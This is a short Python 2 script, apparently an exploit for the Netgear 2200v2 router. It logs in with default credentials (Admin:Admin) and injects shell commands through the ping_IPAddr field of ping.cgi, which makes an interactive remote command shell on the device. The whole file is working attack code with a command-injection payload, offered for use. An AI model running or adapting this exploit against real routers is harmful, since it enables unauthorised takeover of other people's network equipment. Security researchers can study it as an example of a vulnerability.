#!/usr/bin/python

import os,sys, urllib2, readline
from base64 import b64encode
from lxml.html import fromstring

'''
run commands on netgear 2200v2

Thanks to jemp! (from #security at nix.co.il)
'''

target = "192.168.0.1"
user_pass = "Admin:Admin"

def get_return_from_ping_results(text) :
	html = fromstring(text)
	
	element = html.find_class("num")

	return element[0].text_content().replace('\n', '')

def get_command_ping(command, user_pass, target) :
	user_pass = b64encode(user_pass) # encode user:password with base64

	url = "http://" + target + "/ping.cgi"
		
	post_values = "ping=Ping&ping_IPAddr=;echo -ne `" + command + "`"
	
	req = urllib2.Request(url, post_values)
	req.add_header("Authorization", "Basic %s" % user_pass)

	try:
		res = urllib2.urlopen(req)
	except urllib2.HTTPError as msg:
		sys.exit("[-] %s" % msg)
	
	res_data = res.read()
			
	ping_result = get_return_from_ping_results(res_data)
	
	return ping_result if ping_result != "" else "NULL"

def print_usage() :
	print "Usage: %s COMMAND" % sys.argv[0]
	sys.exit(1)

def main() :
	#if len(sys.argv) is 1:
	#	print_usage()
	
	cmd = ''
	
	try:
		while True:
			cmd = raw_input("> ")
			if cmd.strip() == "exit":
				break
						
			print get_command_ping(cmd, user_pass, target)
	except:
		print sys.exc_info()[1]
		
	print sys.exc_info()
	
	
if __name__ == '__main__' :
	main()
